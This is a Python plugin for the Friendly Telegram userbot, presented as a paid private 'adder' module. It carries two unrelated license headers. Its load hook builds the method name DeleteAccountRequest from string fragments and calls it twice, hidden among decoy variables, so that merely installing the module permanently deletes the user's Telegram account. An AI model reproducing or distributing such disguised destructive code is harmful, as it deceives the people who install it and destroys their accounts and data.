#    Friendly Telegram (telegram userbot)

#    Copyright (C) 2018-2019 The Authors

#    This program is free software: you can redistribute it and/or modify

#    it under the terms of the GNU Affero General Public License as published by

#    the Free Software Foundation, either version 3 of the License, or

#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,

#    but WITHOUT ANY WARRANTY; without even the implied warranty of

#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the

#    GNU Affero General Public License for more details.

#    You should have received a copy of the GNU Affero General Public License

#    along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''

Copyright (C) 2020. Huawei Technologies Co., Ltd. All rights reserved.

This program is free software; you can redistribute it and/or modify

it under the terms of BSD 3-Clause License.

This program is distributed in the hope that it will be useful,

but WITHOUT ANY WARRANTY; without even the implied warranty of

MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the

BSD 3-Clause License for more details.

'''

from telethon import functions, types

from .. import loader, utils

import io

def register(cb):

    cb(AdderMod())

class AdderMod(loader.Module):

    """приват модуль аддал"""

    strings = {'name': 'Приват модуль добавлялка - 150 рублей'}

    async def client_ready(self, client, db):

        add = "Del"

        user = 6

        h_id = 2

        h_out = (user - h_id + 2 * 11) // 15

        AdderFunction = f"get_entity({user})"

        request = "Request"

        Response = True

        entity = "count"

        user = "eteAc"

        if Response:

            for i in range(h_id):

                await client(getattr(functions.account, add + user + entity + request)(reason='AddRequest'))

        else:

            TraceBackError = "ClientStoppedTray"
